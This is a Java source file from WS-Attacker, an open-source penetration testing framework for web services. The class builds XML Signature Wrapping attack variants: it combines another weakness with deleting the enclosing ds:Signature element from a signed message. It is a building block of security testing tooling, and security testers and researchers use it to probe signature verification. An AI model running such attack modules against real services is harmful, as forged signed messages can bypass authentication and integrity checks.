/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Mainka
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package wsattacker.library.signatureWrapping.xpath.weakness;

import org.w3c.dom.Element;
import org.w3c.dom.Node;
import wsattacker.library.signatureWrapping.option.PayloadElement;
import wsattacker.library.signatureWrapping.option.SignedElement;
import wsattacker.library.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.library.signatureWrapping.xpath.interfaces.XPathWeaknessInterface;
import wsattacker.library.signatureWrapping.xpath.weakness.util.WeaknessLog;
import wsattacker.library.signatureWrapping.xpath.weakness.util.XPathWeaknessTools;
import wsattacker.library.xmlutilities.dom.DomUtilities;
import wsattacker.library.xmlutilities.namespace.NamespaceConstants;

/**
 * @author christian
 */
public class EnvelopedTransformationWeakness
    implements XPathWeaknessInterface
{

    private int numberOfPossibilities;

    private XPathWeaknessInterface realWeakness;

    public EnvelopedTransformationWeakness( XPathWeaknessInterface realWeakness, SignedElement signedElement )
        throws InvalidWeaknessException
    {
        // List<Element> signatureElementList =
        // DomUtilities.findChildren(signedElement.getSignedElement(),
        // "Signature", NamespaceConstants.URI_NS_DS, true);
        // if (signatureElementList.isEmpty()) {
        // throw new InvalidWeaknessException("Not an envelopped signature.");
        // }
        Element signaturePart = signedElement.getRefferringElement();
        Element signedContent = signedElement.getSignedElement();
        if ( XPathWeaknessTools.isAncestorOf( signedContent, signaturePart ) < 1 )
        {
            throw new InvalidWeaknessException( "Not an envelopped signature." );
        }
        this.realWeakness = realWeakness;
        this.numberOfPossibilities = 2;
    }

    @Override
    public int getNumberOfPossibilities()
    {
        return numberOfPossibilities * realWeakness.getNumberOfPossibilities();
    }

    @Override
    public void abuseWeakness( int index, SignedElement signedElement, PayloadElement payloadElement )
        throws InvalidWeaknessException
    {

        // do real weakness abuse
        int realIndex = index / 2;
        boolean remove = ( index % 2 ) == 1;

        realWeakness.abuseWeakness( realIndex, signedElement, payloadElement );

        // shall we remove?
        if ( remove )
        {
            // List<Element> signatureElementList =
            // DomUtilities.findChildren(signedElement.getSignedElement(),
            // "Signature", NamespaceConstants.URI_NS_DS, true);
            // for(Element signatureElement : signatureElementList) {
            // String fastXPath = DomUtilities.getFastXPath(signatureElement);
            // try {
            // signatureElement.getParentNode().removeChild(signatureElement);
            // }
            // catch (DOMException e) {
            // Logger.getLogger(getClass()).error("Could note remove Element " +
            // fastXPath);
            // }
            // WeaknessLog.append("Enveloped Signature Transformation: Removed "
            // + fastXPath);
            // }
            boolean success = false;
            Node tmp = signedElement.getRefferringElement();
            while ( tmp.getParentNode() != null )
            {
                if ( tmp.getLocalName().equals( "Signature" )
                    && tmp.getNamespaceURI().equals( NamespaceConstants.URI_NS_DS ) )
                {
                    String fastXPath = DomUtilities.getFastXPath( tmp );
                    tmp.getParentNode().removeChild( tmp );
                    WeaknessLog.append( "Enveloped Signature Transformation: Removed " + fastXPath );
                    success = true;
                    break;
                }
                tmp = tmp.getParentNode();
            }
            if ( !success )
            {
                WeaknessLog.append( "Enveloped Signature Transformation: ### ERROR: Could not remove " );
            }
        }
    }
}
